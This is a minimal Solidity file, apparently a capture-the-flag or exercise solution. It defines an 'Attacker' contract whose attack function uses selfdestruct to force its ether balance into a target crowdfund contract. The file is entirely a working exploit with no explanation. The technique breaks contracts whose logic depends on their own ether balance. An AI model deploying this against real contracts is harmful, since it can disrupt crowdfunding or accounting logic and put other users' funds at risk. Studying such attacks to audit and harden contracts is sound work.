// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.1;

contract Attacker{
    fallback() external payable {

    }

    function attack(address _crowdFund) external {
        selfdestruct(payable(_crowdFund));
    }
}
